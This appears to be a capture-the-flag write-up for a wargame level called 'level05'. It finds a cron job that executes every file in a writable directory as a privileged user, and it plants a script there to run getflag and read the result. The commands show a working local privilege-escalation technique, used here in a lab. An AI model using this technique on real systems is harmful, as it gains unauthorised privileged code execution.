We start by searching for any files or directories related to `level05` to gather more information:
```bash
find / -name "*level05" 2>/dev/null
```

The output shows:
```bash
/var/mail/level05
/rofs/var/mail/level05
```

We check the contents of `/var/mail/level05`:
```bash
cat /var/mail/level05
```
The output shows a cron job:
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

This cron job runs every 2 minutes and executes the script `/usr/sbin/openarenaserver` as `flag05`.

Next, we inspect the script:
```bash
cat /usr/sbin/openarenaserver`
```
The output shows:
```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

Let's now inspect the folder where the script runs, and create a script in it:
```bash
cd /opt/openarenaserver/
```

We create a new file called flag that contains the command to run `getflag` and redirect the output to `/tmp/flag`:
```bash
echo '/bin/getflag > /tmp/flag' > /opt/openarenaserver/malicious_script
chmod +x /opt/openarenaserver/malicious_script
```

This makes the file executable, so the cron job will execute it. Every 2 minutes, the cron job runs the files in `/opt/openarenaserver` and deletes them, which for us means that it executes the getflag command and writes the flag to `/tmp/flag`.

Now, we check the contents of `/tmp/flag` to retrieve the flag:
```bash
cat /tmp/flag
```